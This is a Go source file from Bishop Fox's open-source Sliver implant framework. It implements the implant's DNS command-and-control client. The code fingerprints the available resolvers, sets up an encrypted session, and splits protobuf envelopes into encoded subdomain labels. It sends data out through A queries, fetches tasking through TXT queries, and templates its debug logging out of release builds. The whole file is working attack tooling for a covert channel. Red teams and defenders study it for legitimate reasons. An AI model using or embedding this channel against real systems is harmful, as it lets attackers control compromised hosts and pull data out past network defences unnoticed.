package dnsclient

/*
	Sliver Implant Framework
	Copyright (C) 2021  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.

--------------------------------------------------------------------------

	*** BASE32 ***
	DNS domains are limited to 254 characters including '.' so that means
	Base 32 encoding, so (n*8 + 4) / log2(32) = 63 means we can encode 39 bytes
	per subdomain.

	Format: (subdata...).<ns domain>.<parent domain>
		[63].[63]...[ns].[parent].

	254 - len(parent) = subdata space, 128 is our worst case where the parent domain is 126 chars,
	where [63 NS . 63 TLD], so 128 / 63 = 2 * 39 bytes = 78 bytes, worst case per query

	We need to include some metadata in each request:
		Type = 2 bytes max
		ID = 4 bytes max
		Start = 4 bytes max
		Stop = 4 bytes max
		Size = 4 bytes max
		Data = 78 - (2+4+4+4+4) ~= 60 bytes per query worst case

	*** BASE58 ***
	Base58 ~2% less efficient than Base64, but we can't use all 64 chars in DNS so
	it's just not an option, we could potentially use some type of Base62 encoding
	but those implementations are more complex and only marginally more efficient
	than Base58, and Base58 avoids any complexities with '-' in domain names.

	The idea is that since the server returns the messages CRC32 checksum we can detect
	when the message is transparently corrupted by some rude resolver. So when we init
	the session we send a few messages with random data to see if we can use Base58, and
	fallback to Base32 if we detect problems.
*/

// {{if .Config.DNSc2Enabled}}

import (
	"crypto/rand"
	"encoding/binary"
	"errors"
	"hash/crc32"
	insecureRand "math/rand"
	"net/url"
	"strconv"
	"strings"
	"sync"
	"time"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"github.com/bishopfox/sliver/implant/sliver/cryptography"
	"github.com/bishopfox/sliver/implant/sliver/encoders"
	"github.com/bishopfox/sliver/protobuf/dnspb"
	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/miekg/dns"
	"google.golang.org/protobuf/proto"
)

const (
	// Little endian
	sessionIDBitMask = 0x00ffffff // Bitwise mask to get the dns session ID
	metricsMaxSize   = 8
	queueBufSize     = 1024
)

var (
	errMsgTooLong          = errors.New("{{if .Config.Debug}}Too much data to encode{{end}}")
	errInvalidDNSSessionID = errors.New("{{if .Config.Debug}}Invalid dns session id{{end}}")
	errNoResolvers         = errors.New("{{if .Config.Debug}}No resolvers found{{end}}")
	ErrTimeout             = errors.New("{{if .Config.Debug}}DNS Timeout{{end}}")
	ErrClosed              = errors.New("dns session closed")
	ErrInvalidResponse     = errors.New("invalid response")
	ErrInvalidIndex        = errors.New("invalid start/stop index")
	ErrEmptyResponse       = errors.New("empty response")
)

// DNSOptions - c2 specific options
type DNSOptions struct {
	QueryTimeout      time.Duration
	RetryWait         time.Duration
	RetryCount        int
	MaxErrors         int
	WokersPerResolver int
	ForceBase32       bool
	ForceResolvConf   string
}

// ParseDNSOptions - Parse c2 specific options
func ParseDNSOptions(c2URI *url.URL) *DNSOptions {
	// Query timeout
	queryTimeout, err := time.ParseDuration(c2URI.Query().Get("timeout"))
	if err != nil {
		queryTimeout = time.Second * 5
	}
	// Retry wait
	retryWait, err := time.ParseDuration(c2URI.Query().Get("retry-wait"))
	if err != nil {
		retryWait = time.Second * 1
	}
	// Retry count
	retryCount, err := strconv.Atoi(c2URI.Query().Get("retry-count"))
	if err != nil {
		retryCount = 3
	}
	// Workers per resolver
	workersPerResolver, err := strconv.Atoi(c2URI.Query().Get("workers-per-resolver"))
	if err != nil || workersPerResolver < 1 {
		workersPerResolver = 2
	}
	// Max errors
	maxErrors, err := strconv.Atoi(c2URI.Query().Get("max-errors"))
	if err != nil || maxErrors < 0 {
		maxErrors = 10
	}

	return &DNSOptions{
		QueryTimeout:      queryTimeout,
		RetryWait:         retryWait,
		RetryCount:        retryCount,
		MaxErrors:         maxErrors,
		WokersPerResolver: workersPerResolver,
		ForceBase32:       strings.ToLower(c2URI.Query().Get("force-base32")) == "true",
		ForceResolvConf:   c2URI.Query().Get("force-resolv-conf"),
	}
}

// DNSStartSession - Attempt to establish a connection to the DNS server of 'parent'
func DNSStartSession(parent string, opts *DNSOptions) (*SliverDNSClient, error) {
	// {{if .Config.Debug}}
	log.Printf("DNS client connecting to '%s' (timeout: %s) ...", parent, opts.QueryTimeout)
	// {{end}}
	client := NewDNSClient(parent, opts)
	err := client.SessionInit()
	if err != nil {
		return nil, err
	}
	return client, nil
}

// NewDNSClient - Initialize a new DNS client, generally you should use DNSStartSession
// instead of this function, this is exported mostly for unit testing
func NewDNSClient(parent string, opts *DNSOptions) *SliverDNSClient {
	parent = strings.TrimSuffix("."+strings.TrimPrefix(parent, "."), ".") + "."
	return &SliverDNSClient{
		metadata:        map[string]*ResolverMetadata{},
		parent:          parent,
		forceBase32:     opts.ForceBase32,
		forceResolvConf: opts.ForceResolvConf,
		queryTimeout:    opts.QueryTimeout,
		retryWait:       opts.RetryWait,
		retryCount:      opts.RetryCount,
		closed:          true,

		WorkersPerResolver: opts.WokersPerResolver,
		subdataSpace:       254 - len(parent) - (1 + (254-len(parent))/64),
		base32:             encoders.Base32{},
		base58:             encoders.Base58{},
	}
}

// SliverDNSClient - The DNS client context
type SliverDNSClient struct {
	resolvers  []DNSResolver
	resolvConf *dns.ClientConfig
	metadata   map[string]*ResolverMetadata

	parent          string
	retryWait       time.Duration
	retryCount      int
	queryTimeout    time.Duration
	forceBase32     bool
	forceResolvConf string
	subdataSpace    int
	dnsSessionID    uint32
	msgCount        uint32
	closed          bool

	cipherCtx          *cryptography.CipherContext
	recvQueue          chan *DNSWork
	sendQueue          chan *DNSWork
	workerPool         []*DNSWorker
	WorkersPerResolver int

	base32 encoders.Base32
	base58 encoders.Base58

	enableCaseSensitiveEncoder bool
}

// DNSWork - Single unit of work for DNSWorker
type DNSWork struct {
	QueryType uint16
	Domain    string
	Wg        *sync.WaitGroup
	Results   chan *DNSResult
}

// DNSResult - Result of a DNSWork unit
type DNSResult struct {
	Data []byte
	Err  error
}

// DNSWorker - Used for parallel send/recv
type DNSWorker struct {
	resolver DNSResolver
	Metadata *ResolverMetadata
	Ctrl     chan struct{}
}

// Start - Starts with worker with a given queue
func (w *DNSWorker) Start(id int, recvQueue <-chan *DNSWork, sendQueue <-chan *DNSWork) {
	go func() {
		// {{if .Config.Debug}}
		log.Printf("[dns] starting worker #%d", id)
		// {{end}}

		for {
			var work *DNSWork
			select {
			case work = <-recvQueue:
			case work = <-sendQueue:
			case <-w.Ctrl:
				return
			}
			var data []byte
			var err error

			// {{if .Config.Debug}}
			log.Printf("[dns] #%d work: %v", id, work)
			// {{end}}
			switch work.QueryType {
			case dns.TypeA:
				data, _, err = w.resolver.A(work.Domain)
			case dns.TypeTXT:
				data, _, err = w.resolver.TXT(work.Domain)
			}
			if work.Results != nil {
				work.Results <- &DNSResult{data, err}
			}
			if work.Wg != nil {
				work.Wg.Done()
			}
		}
	}()
}

// ResolverMetadata - Metadata for the resolver
type ResolverMetadata struct {
	Address      string
	EnableBase58 bool
	Metrics      []time.Duration
	Errors       int
}

// SessionInit - Initialize DNS session
func (s *SliverDNSClient) SessionInit() error {
	err := s.loadResolvConf()
	if err != nil {
		return err
	}
	if len(s.resolvConf.Servers) < 1 {
		// {{if .Config.Debug}}
		log.Printf("[dns] no configured resolvers!")
		// {{end}}
		return errNoResolvers
	}
	s.resolvers = []DNSResolver{}
	for _, server := range s.resolvConf.Servers {
		s.resolvers = append(s.resolvers,
			NewGenericResolver(server, s.resolvConf.Port, s.retryWait, s.retryCount, s.queryTimeout),
		)
	}
	// {{if .Config.Debug}}
	log.Printf("[dns] found resolvers: %v", s.resolvConf.Servers)
	// {{end}}

	err = s.getDNSSessionID() // Get a 'dns session id'
	if err != nil {
		return err
	}
	s.fingerprintResolvers() // Fingerprint the resolvers
	if len(s.resolvers) < 1 {
		// {{if .Config.Debug}}
		log.Printf("[dns] no working resolvers!")
		// {{end}}
		return errNoResolvers
	}

	// Key agreement with server
	sKey := cryptography.RandomKey()
	s.cipherCtx = cryptography.NewCipherContext(sKey)
	initData, err := cryptography.ECCEncryptToServer(sKey[:])
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[dns] failed to encrypt init msg %v", err)
		// {{end}}
		return err
	}
	resolver, meta := s.randomResolver()
	var encoder encoders.Encoder
	if meta.EnableBase58 {
		encoder = s.base58
	} else {
		encoder = s.base32
	}
	initMsg := &dnspb.DNSMessage{
		ID:   s.nextMsgID(),
		Type: dnspb.DNSMessageType_INIT,
		Size: uint32(len(initData)),
	}
	respData, err := s.sendInit(resolver, encoder, initMsg, initData)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[dns] init msg send failure %v", err)
		// {{end}}
		return err
	}
	data, err := s.cipherCtx.Decrypt(respData)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[dns] init msg decryption failure %v", err)
		// {{end}}
		return err
	}
	if binary.LittleEndian.Uint32(data)&sessionIDBitMask != s.dnsSessionID {
		// {{if .Config.Debug}}
		log.Printf("[dns] init msg dns session id mismatch")
		// {{end}}
		return err
	}

	// Good to go!
	// {{if .Config.Debug}}
	log.Printf("[dns] key exchange was successful!")
	// {{end}}

	// {{if .Config.Debug}}
	log.Printf("[dns] starting worker(s) ...")
	// {{end}}
	s.recvQueue = make(chan *DNSWork, queueBufSize)
	s.sendQueue = make(chan *DNSWork, queueBufSize)

	// Workers per-resolver
	for i := 0; i < s.WorkersPerResolver; i++ {
		for id, resolver := range s.resolvers {
			worker := &DNSWorker{
				resolver: resolver,
				Metadata: s.metadata[resolver.Address()],
				Ctrl:     make(chan struct{}),
			}
			s.workerPool = append(s.workerPool, worker)
			worker.Start(id, s.recvQueue, s.sendQueue)
		}
	}

	s.closed = false
	return nil
}

func (s *SliverDNSClient) sendInit(resolver DNSResolver, encoder encoders.Encoder, msg *dnspb.DNSMessage, data []byte) ([]byte, error) {
	allSubdata, err := s.SplitBuffer(msg, encoder, data)
	if err != nil {
		return nil, err
	}
	resp := []byte{}
	for _, subdata := range allSubdata {
		respData, _, err := resolver.TXT(subdata)
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("[dns] init msg failure %v", err)
			// {{end}}
			return nil, err
		}
		if 0 < len(respData) {
			resp = append(resp, respData...)
		}
	}
	return resp, nil
}

// WriteEnvelope - Send an envelope to the server
func (s *SliverDNSClient) WriteEnvelope(envelope *pb.Envelope) error {
	if s.closed {
		return ErrClosed
	}
	// {{if .Config.Debug}}
	log.Printf("[dns] write envelope ...")
	// {{end}}

	envelopeData, err := proto.Marshal(envelope)
	if err != nil {
		return err
	}
	ciphertext, err := s.cipherCtx.Encrypt(envelopeData)
	if err != nil {
		return err
	}
	return s.parallelSend(ciphertext)
}

// ReadEnvelope - Recv an envelope from the server
func (s *SliverDNSClient) ReadEnvelope() (*pb.Envelope, error) {
	if s.closed {
		return nil, ErrClosed
	}
	// {{if .Config.Debug}}
	log.Printf("[dns] read envelope ...")
	// {{end}}

	resolver, meta := s.randomResolver()
	pollMsg, err := s.pollMsg(meta)
	if err != nil {
		return nil, err
	}
	domain, err := s.joinSubdataToParent(pollMsg)
	if err != nil {
		return nil, err
	}
	// {{if .Config.Debug}}
	log.Printf("[dns] poll msg domain: %v", domain)
	// {{end}}
	respData, _, err := resolver.TXT(domain)
	if err != nil {
		return nil, err
	}
	// {{if .Config.Debug}}
	log.Printf("[dns] read msg resp data: %v", respData)
	// {{end}}
	if len(respData) < 1 {
		return nil, nil
	}

	dnsMsg := &dnspb.DNSMessage{}
	err = proto.Unmarshal(respData, dnsMsg)
	if err != nil {
		return nil, err
	}
	if dnsMsg.Type != dnspb.DNSMessageType_MANIFEST {
		return nil, ErrInvalidResponse
	}
	if dnsMsg.Size == 0 {
		return nil, nil
	}
	ciphertext, err := s.parallelRecv(dnsMsg)
	if err != nil {
		return nil, err
	}

	plaintext, err := s.cipherCtx.Decrypt(ciphertext)
	if err != nil {
		return nil, err
	}
	envelope := &pb.Envelope{}
	err = proto.Unmarshal(plaintext, envelope)
	return envelope, err
}

// Close - Close the dns session
func (s *SliverDNSClient) CloseSession() error {
	s.closed = true
	for _, worker := range s.workerPool {
		worker.Ctrl <- struct{}{}
	}
	close(s.recvQueue)
	close(s.sendQueue)
	return nil
}

// parallelSend - send a full message to teh server
func (s *SliverDNSClient) parallelSend(data []byte) error {
	var encoder encoders.Encoder
	if s.enableCaseSensitiveEncoder {
		encoder = s.base58
	} else {
		encoder = s.base32
	}
	msg := &dnspb.DNSMessage{
		Type: dnspb.DNSMessageType_DATA_FROM_IMPLANT,
		ID:   s.nextMsgID(),
		Size: uint32(len(data)),
	}

	domains, err := s.SplitBuffer(msg, encoder, data)
	if err != nil {
		return err
	}

	wg := &sync.WaitGroup{}
	for _, domain := range domains {
		wg.Add(1)
		s.sendQueue <- &DNSWork{
			QueryType: dns.TypeA,
			Domain:    domain,
			Wg:        wg,
			Results:   nil,
		}
	}
	wg.Wait()
	return nil
}

func (s *SliverDNSClient) parallelRecv(manifest *dnspb.DNSMessage) ([]byte, error) {
	if manifest.Type != dnspb.DNSMessageType_MANIFEST {
		return nil, ErrInvalidResponse
	}

	const bytesPerTxt = 182 // 189 with base64, -6 metadata, -1 margin

	wg := &sync.WaitGroup{}
	results := make(chan *DNSResult, int(manifest.Size/bytesPerTxt)+1)
	for start := uint32(0); start < manifest.Size; start += bytesPerTxt {
		stop := start + bytesPerTxt
		if manifest.Size < stop {
			stop = manifest.Size
		}
		// {{if .Config.Debug}}
		log.Printf("[dns] parallel read (%d): %d -> %d of %d", manifest.ID, start, stop, manifest.Size)
		// {{end}}
		recvMsg, _ := proto.Marshal(&dnspb.DNSMessage{
			ID:    manifest.ID,
			Type:  dnspb.DNSMessageType_DATA_TO_IMPLANT,
			Start: start,
			Stop:  stop,
		})
		// This message will always fit in base32
		domain, err := s.joinSubdataToParent(string(s.base32.Encode(recvMsg)))
		if err != nil {
			return nil, err
		}

		wg.Add(1)
		s.recvQueue <- &DNSWork{
			QueryType: dns.TypeTXT,
			Domain:    domain,
			Wg:        wg,
			Results:   results,
		}
	}

	// {{if .Config.Debug}}
	log.Printf("[dns] collecting read results ...")
	// {{end}}

	recvData := make(chan []byte)
	errors := []error{}
	go func() {
		recvDataBuf := make([]byte, manifest.Size)
		for result := range results {
			if result.Err != nil {
				errors = append(errors, result.Err)
				continue
			}
			// {{if .Config.Debug}}
			log.Printf("[dns] read result data: %v", result.Data)
			// {{end}}
			recvMsg := &dnspb.DNSMessage{}
			err := proto.Unmarshal(result.Data, recvMsg)
			if err != nil {
				errors = append(errors, result.Err)
				continue
			}
			// {{if .Config.Debug}}
			log.Printf("[dns] recv msg: %v", recvMsg)
			// {{end}}
			if manifest.Size < recvMsg.Start || int(manifest.Size) < int(recvMsg.Start)+len(recvMsg.Data) {
				errors = append(errors, ErrInvalidIndex)
				continue
			}
			copy(recvDataBuf[recvMsg.Start:], recvMsg.Data)
		}
		// {{if .Config.Debug}}
		log.Printf("[dns] all data collected: %v", recvDataBuf)
		// {{end}}
		recvData <- recvDataBuf
	}()

	// {{if .Config.Debug}}
	log.Printf("[dns] waiting for workers ...")
	// {{end}}
	wg.Wait() // All results are in the channel

	// {{if .Config.Debug}}
	log.Printf("[dns] workers completed, close results channel ...")
	// {{end}}
	close(results)

	if 0 < len(errors) {
		// {{if .Config.Debug}}
		log.Printf("[dns] read errors: %v", errors)
		// {{end}}
		return nil, errors[0]
	}

	// {{if .Config.Debug}}
	log.Printf("[dns] collecting recvData ...")
	// {{end}}
	return <-recvData, nil
}

// SplitBuffer - There's probably a fancy way to calculate this with math and shit but it's much easier to just encode bytes
// and check the length until we hit the limit
func (s *SliverDNSClient) SplitBuffer(msg *dnspb.DNSMessage, encoder encoders.Encoder, data []byte) ([]string, error) {
	subdata := []string{}
	start := 0
	stop := start
	lastLen := 0
	var encoded string
	// {{if .Config.Debug}}
	encodedSubdata := []string{}
	// {{end}}
	for index := 0; stop < len(data); index++ {
		if len(data) < index {
			panic("boundary miscalculation") // We should always be able to encode more than one byte
		}
		msg.Start = uint32(start)
		if lastLen == 0 {
			stop += int(float64(s.subdataSpace)/2) - 1 // base32 overhead is about 160%
		} else {
			stop += (lastLen - 4) // max start uint32 overhead
		}
		if len(data) <= stop {
			stop = len(data) - 1 // make sure the loop is executed at least once
		}

		// Sometimes adding a byte will result in +2 chars so we -1 the subdata space
		encoded = ""
		// {{if .Config.Debug}}
		log.Printf("[dns] encoded: %d, subdata space: %d | stop: %d, len: %d",
			len(encoded), (s.subdataSpace - 1), stop, len(data))
		// {{end}}
		for len(encoded) < (s.subdataSpace-1) && stop < len(data) {
			stop++
			// {{if .Config.Debug}}
			log.Printf("[dns] shave data [%d:%d] of %d", start, stop, len(data))
			// {{end}}
			msg.Data = data[start:stop]
			pbMsg, _ := proto.Marshal(msg)
			encoded = string(encoder.Encode(pbMsg))
			// {{if .Config.Debug}}
			log.Printf("[dns] encoded length is %d (max: %d)", len(encoded), s.subdataSpace)
			// {{end}}
		}
		lastLen = len(msg.Data) // Save the amount of data that fit for the next loop
		// {{if .Config.Debug}}
		encodedSubdata = append(encodedSubdata, encoded)
		// {{end}}
		domain, err := s.joinSubdataToParent(encoded)
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("[dns] join subdata failed: %s", err)
			// {{end}}
			return nil, err
		}
		subdata = append(subdata, domain)
		start = stop
	}

	// {{if .Config.Debug}}
	total := 0
	for index, domain := range encodedSubdata {
		dnsMsg := &dnspb.DNSMessage{}
		rawData, err := encoder.Decode([]byte(domain))
		if err != nil {
			log.Printf("[dns] decode failed: %s", err)
			panic("failed to decode subdata")
		}
		proto.Unmarshal(rawData, dnsMsg)
		total += len(dnsMsg.Data)
		log.Printf("[dns] subdata %d (%d->%d): %d bytes",
			index, dnsMsg.Start, int(dnsMsg.Start)+len(dnsMsg.Data), len(dnsMsg.Data))
	}
	log.Printf("[dns] original data: %d bytes", len(data))
	log.Printf("[dns] total subdata: %d bytes", total)
	if total != len(data) {
		panic("failed to properly encode subdata")
	}
	// {{end}}

	return subdata, nil
}

func (s *SliverDNSClient) getDNSSessionID() error {
	otpMsg, err := s.otpMsg()
	if err != nil {
		return err
	}
	otpDomain, err := s.joinSubdataToParent(otpMsg)
	if err != nil {
		return err
	}
	// {{if .Config.Debug}}
	log.Printf("[dns] Fetching dns session id via '%s' ...", otpDomain)
	// {{end}}

	var a []byte
	for _, resolver := range s.resolvers {
		a, _, err = resolver.A(otpDomain)
		if err == nil {
			break
		}
	}
	if err != nil {
		return err // All resolvers failed
	}
	if len(a) < 1 {
		return errInvalidDNSSessionID
	}
	s.dnsSessionID = binary.LittleEndian.Uint32(a) & sessionIDBitMask
	if s.dnsSessionID == 0 {
		return errInvalidDNSSessionID
	}
	// {{if .Config.Debug}}
	log.Printf("[dns] dns session id: %d", s.dnsSessionID)
	// {{end}}
	return nil
}

func (s *SliverDNSClient) loadResolvConf() error {
	var err error
	if len(s.forceResolvConf) < 1 {
		s.resolvConf, err = dnsClientConfig()
	} else {
		// {{if .Config.Debug}}
		log.Printf("[dns] Using forced resolv.conf: %s", s.forceResolvConf)
		// {{end}}
		s.resolvConf, err = dns.ClientConfigFromReader(strings.NewReader(s.forceResolvConf))
	}
	return err
}

// Joins subdata to the parent domain, you must have already done the math to
// ensure the subdata can fit in the domain
func (s *SliverDNSClient) joinSubdataToParent(subdata string) (string, error) {
	if s.subdataSpace < len(subdata) {
		return "", errMsgTooLong // For sure won't fit after we add '.'
	}
	subdomains := []string{}
	for index := 0; index < len(subdata); index += 63 {
		stop := index + 63
		if len(subdata) < stop {
			stop = len(subdata)
		}
		subdomains = append(subdomains, subdata[index:stop])
	}
	// s.parent already has a leading '.'
	domain := strings.Join(subdomains, ".") + s.parent
	if 254 < len(domain) {
		return "", errMsgTooLong
	}
	return domain, nil
}

func (s *SliverDNSClient) pollMsg(meta *ResolverMetadata) (string, error) {
	nonceBuf := make([]byte, 8)
	rand.Read(nonceBuf)
	pollMsg, _ := proto.Marshal(&dnspb.DNSMessage{
		ID:   s.dnsSessionID,
		Type: dnspb.DNSMessageType_POLL,
		Data: nonceBuf,
	})
	if s.enableCaseSensitiveEncoder {
		return string(s.base58.Encode(pollMsg)), nil
	} else {
		return string(s.base32.Encode(pollMsg)), nil
	}
}

func (s *SliverDNSClient) otpMsg() (string, error) {
	otpCode := cryptography.GetOTPCode()
	otp, err := strconv.Atoi(otpCode)
	if err != nil {
		return "", err
	}
	otpMsg := &dnspb.DNSMessage{
		Type: dnspb.DNSMessageType_TOTP,
		ID:   uint32(otp), // Take advantage of the variable length encoding
	}
	data, err := proto.Marshal(otpMsg)
	if err != nil {
		return "", err
	}
	return string(s.base32.Encode(data)), nil
}

// fingerprintResolver - Fingerprints resolve to determine if we can use a case sensitive encoding
func (s *SliverDNSClient) fingerprintResolvers() {
	wg := &sync.WaitGroup{}
	// {{if .Config.Debug}}
	log.Printf("[dns] Fingerprinting %d resolver(s) ...", len(s.resolvers))
	// {{end}}
	results := make(chan *ResolverMetadata)
	for id, resolver := range s.resolvers {
		wg.Add(1)
		go s.fingerprintResolver(id, wg, results, resolver)
	}
	done := make(chan struct{})
	go func() {
		for result := range results {
			s.metadata[result.Address] = result
		}
		done <- struct{}{}
	}()
	wg.Wait()
	close(results)
	<-done // Ensure the result collection goroutine is done

	// {{if .Config.Debug}}
	for _, result := range s.metadata {
		log.Printf("[dns] %s: avg rtt %s, base58: %v, errors %d",
			result.Address, s.averageRtt(result), result.EnableBase58, result.Errors)
	}
	// {{end}}

	// NOTE: In the future we may want to add a configurable error threshold for now
	// if we encounter any errors we don't use the resolver.
	workingResolvers := []DNSResolver{}
	allSupportBase58 := true
	for _, resolver := range s.resolvers {
		meta := s.metadata[resolver.Address()]
		if 0 < meta.Errors {
			// {{if .Config.Debug}}
			log.Printf("[dns] WARNING: removing resolver %s (too many errors)", resolver.Address())
			// {{end}}
			continue
		}
		if !meta.EnableBase58 {
			allSupportBase58 = false
		}
		workingResolvers = append(workingResolvers, resolver)
	}
	if allSupportBase58 && !s.forceBase32 {
		s.enableCaseSensitiveEncoder = true
	}
	s.resolvers = workingResolvers
}

// Fingerprints a single resolver to determine if we can use a case sensitive encoding, average
// round trip time, and if it works at all
func (s *SliverDNSClient) fingerprintResolver(id int, wg *sync.WaitGroup, results chan<- *ResolverMetadata, resolver DNSResolver) {
	defer wg.Done()
	meta := &ResolverMetadata{
		Address:      resolver.Address(),
		EnableBase58: false,
		Metrics:      []time.Duration{},
		Errors:       0,
	}
	s.benchmark(id, s.base32, resolver, meta)
	if meta.Errors == 0 && !s.forceBase32 {
		s.benchmark(id, s.base58, resolver, meta)
		if meta.Errors == 0 {
			meta.EnableBase58 = true
		} else {
			meta.EnableBase58 = false
			meta.Errors = 0 // Reset base32 error count
		}
	}
	results <- meta
}

func (s *SliverDNSClient) benchmark(id int, encoder encoders.Encoder, resolver DNSResolver, meta *ResolverMetadata) {
	for index := 0; index < metricsMaxSize/2; index++ {
		finger, fingerChecksum, err := s.fingerprintMsg(id)
		if err != nil {
			meta.Errors++
			// {{if .Config.Debug}}
			log.Printf("[dns (%d)] failed to marshal fingerprint msg: %v", id, err)
			// {{end}}
			continue
		}
		domain, err := s.joinSubdataToParent(string(encoder.Encode(finger)))
		if err != nil {
			meta.Errors++
			// {{if .Config.Debug}}
			log.Printf("[dns (%d)] failed to encode subdata: %s", id, err)
			// {{end}}
			continue
		}
		data, rtt, err := resolver.A(domain)
		if err != nil || len(data) < 1 {
			meta.Errors++
			// {{if .Config.Debug}}
			log.Printf("[dns (%d)] resolver failed: %s", id, err)
			// {{end}}
			continue
		}

		if fingerChecksum != binary.LittleEndian.Uint32(data) {
			meta.Errors++
			// {{if .Config.Debug}}
			log.Printf("[dns (%d)] error checksum mismatch expected: %d, got: %d",
				id, fingerChecksum, binary.LittleEndian.Uint32(data))
			// {{end}}
			continue
		}
		s.recordMetrics(meta, rtt)
	}
}

func (s *SliverDNSClient) fingerprintMsg(id int) ([]byte, uint32, error) {
	data := make([]byte, 8)
	rand.Read(data)
	fingerprintMsg := &dnspb.DNSMessage{
		Type: dnspb.DNSMessageType_NOP,
		ID:   s.msgID(uint32(id)), // Take advantage of the variable length encoding
		Data: data,
	}
	msg, err := proto.Marshal(fingerprintMsg)
	return msg, crc32.ChecksumIEEE(msg), err
}

// msgID - Combine (bitwise-OR) DNS session ID with message ID
func (s *SliverDNSClient) msgID(id uint32) uint32 {
	return uint32(id<<24) | uint32(s.dnsSessionID)
}

func (s *SliverDNSClient) nextMsgID() uint32 {
	s.msgCount++
	return s.msgID(s.msgCount % 255)
}

// WARNING: The metrics map is not mutex'd so you cannot modify it in this
// method since it'll be executed in a goroutine. The map should already be
// setup for us so any key error here should panic
func (s *SliverDNSClient) recordMetrics(meta *ResolverMetadata, rtt time.Duration) {
	// Prepend metrics slice, drop oldest if we have more than metricsMaxSize
	if len(meta.Metrics) < metricsMaxSize {
		meta.Metrics = append([]time.Duration{rtt}, meta.Metrics...)
	} else {
		meta.Metrics = append([]time.Duration{rtt}, meta.Metrics[:metricsMaxSize-1]...)
	}
}

func (s *SliverDNSClient) averageRtt(meta *ResolverMetadata) time.Duration {
	if len(meta.Metrics) < 1 {
		return time.Duration(0)
	}
	var sum time.Duration
	for _, rtt := range meta.Metrics {
		sum += rtt
	}
	return time.Duration(int64(sum) / int64(len(meta.Metrics)))
}

func (s *SliverDNSClient) randomResolver() (DNSResolver, *ResolverMetadata) {
	resolver := s.resolvers[insecureRand.Intn(len(s.resolvers))]
	return resolver, s.metadata[resolver.Address()]
}

// {{end}} -DNSc2Enabled
